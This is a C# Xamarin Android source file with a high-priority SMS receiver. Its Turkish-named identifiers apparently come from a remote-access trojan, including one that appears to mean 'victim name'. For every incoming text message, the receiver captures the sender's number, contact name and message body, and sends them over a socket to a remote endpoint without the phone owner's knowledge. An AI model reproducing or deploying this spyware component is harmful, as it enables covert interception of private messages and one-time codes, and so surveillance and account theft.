using Android.App;
using Android.Content;
using Android.OS;
using Android.Telephony;
using System;

namespace Task2
{
    [BroadcastReceiver(Enabled = true, Label = "SMS Receiver", Exported = true)]
    [IntentFilter(new[] { "android.provider.Telephony.SMS_RECEIVED" }, Priority = (int)IntentFilterPriority.HighPriority)]
    class SMSBroadcastReceiver : BroadcastReceiver
    {
        public override void OnReceive(Context context, Intent intent)
        {
            Bundle bundle = intent.Extras;
            try
            {
                if (bundle != null)
                {
                    string message = "";
                    string phoneNumber = "";
                    Java.Lang.Object[] pdusObj = (Java.Lang.Object[])bundle.Get("pdus");
                    SmsMessage[] messages = new SmsMessage[pdusObj.Length];
                    for (int i = 0; i < messages.Length; i++)
                    {
                        if (Build.VERSION.SdkInt >= BuildVersionCodes.M)
                        {
                            string format = bundle.GetString("format");
                            messages[i] = SmsMessage.CreateFromPdu((byte[])pdusObj[i], format);
                        }
                        else
                        {
                            messages[i] = SmsMessage.CreateFromPdu((byte[])pdusObj[i]);
                        }
                        phoneNumber = messages[i].OriginatingAddress;
                        message += messages[i].MessageBody;
                        message += "\n";
                    }
                  
                    string senderNum = phoneNumber;
                    string isim = ((MainActivity)MainActivity.global_activity).telefondanIsim(senderNum);

                    ((MainActivity)MainActivity.global_activity).
                    soketimizeGonder("RECSMS", "[VERI]" + isim + "[VERI]" + senderNum + "[VERI]" + message +
                   "[VERI]" + MainValues.KRBN_ISMI + "@" + MainActivity.Soketimiz.RemoteEndPoint.ToString() + "[VERI][0x09]");
                }


            }
            catch (Exception)
            {
            }
        }
    }
}